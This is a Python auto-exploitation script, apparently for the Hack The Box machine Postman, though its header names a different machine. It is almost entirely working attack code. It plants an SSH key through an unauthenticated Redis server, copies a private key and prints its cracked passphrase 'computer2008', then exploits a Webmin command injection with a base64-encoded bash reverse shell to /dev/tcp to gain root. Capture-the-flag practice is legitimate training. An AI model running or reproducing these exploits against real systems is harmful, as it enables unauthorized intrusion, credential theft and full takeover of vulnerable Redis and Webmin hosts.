### Auto-Pwn
### Lame - Easy Linux
### By baX
#####################
#!/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import os.path
from sys import argv
from termcolor import colored
from pwn import *
import random
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import base64
import urllib.parse


script, ip_address = argv

PATH='/usr/bin/redis-cli'

def ssh_connection(id_rsa_path, user):
	os.system("ssh -i " + id_rsa_path + " " +user+"@"+ip_address)

def part1_Redis():
	if os.path.isfile(PATH):
		try:
			print(colored('\t[Part 1] REDIS SERVER' ,"green"))

			os.system("(echo '\r\n\'; cat $HOME/.ssh/id_rsa.pub; echo  \'\r\n\') > $HOME/.ssh/public_key.txt")
			os.system("redis-cli -h " + ip_address + ' flushall')
			cmd = "redis-cli -h " + ip_address
			os.system("cat $HOME/.ssh/public_key.txt | redis-cli -h " +  ip_address + ' -x set public_key')
			os.system(cmd + ' GET public_key')
			os.system(cmd + ' config set  dir /var/lib/redis/.ssh/')
			os.system(cmd + ' config set dbfilename authorized_keys')
			os.system(cmd + ' save')
			#ssh_connection("$HOME/.ssh/id_rsa ", "redis")
		except:
			print("Something went wrong")
	else:
		print(colored("No redis-cli ### sudo apt install redis-tools", "red"))

def part2_user_matt():
	print(colored('\t[Part 2] Escalating to user Matt' ,"green"))
	os.system("scp -i " + '$HOME/.ssh/id_rsa ' + "redis"+"@"+ip_address+":/opt/id_rsa.bak ./id_rsa")
	os.system("chmod 600 id_rsa")
	print(colored('\t/JohnTheRipper/run/ssh2john.py ./id_rsa > id_rsa.hash', "blue"))
	print(colored('\tjohn id_rsa.hash --format=SSH --wordlist=/usr/share/wordlists/rockyou.txt', "blue"))
	print(colored('\tcomputer2008\n', "green"))

	s =  ssh(host=ip_address,user='redis',keyfile="/root/.ssh/id_rsa")
	p = s.process('/bin/bash')
	p.sendline('su Matt')
	p.recvline(timeout=5)
	p.sendline('computer2008')
	p.recvline(timeout=5)
	p.sendline('cat /home/Matt/user.txt')

	user = p.recvline().split()
	print(colored('User.txt = '+ user[2].decode("utf-8"), "green"))
	s.close()


def part3_root():
	PORT = randint(8000, 9000)
	client = listen(PORT)
	s = requests.Session()
	resp = s.post(f'https://{ip_address}:10000/session_login.cgi', data={'page':'', 'user': 'Matt', 'pass': 'computer2008'},cookies={"testing":"1"}, verify=False, allow_redirects=False)
	sid = resp.headers['Set-Cookie'].replace('\n', '').split('=')[1].split(";")[0].strip()
	LHOST = os.popen("ip -4 addr s tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'").read()
	LHOST = LHOST[:-1]
	payload = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{PORT} 0>&1'".encode('ascii')
	b64payload = base64.b64encode(payload).decode('ascii').replace('\n', '').strip()
	payload_final ='$(echo${IFS}'+b64payload+'|base64${IFS}-d|bash)'
	print(payload_final)
	try:
		resp = s.post('https://' + ip_address + ':10000/package-updates/update.cgi', cookies={"sid":sid}, data={'u':['acl/apt', payload_final]}, verify=False, headers={'Referer':'https://'+ ip_address + ':10000/package-updates/?xnavigation=1'}, proxies={'https':'http://127.0.0.1:8080'})
		print(colored("ROOT SHELL", "green"))
		client.interactive()
	except:
		print(colored("ERROR", "red"))


if __name__ == '__main__':
	print(colored('\t[HTB][Postman]', "green"))
	print("")
	#part1_Redis()
	#part2_user_matt()
	part3_root()

	
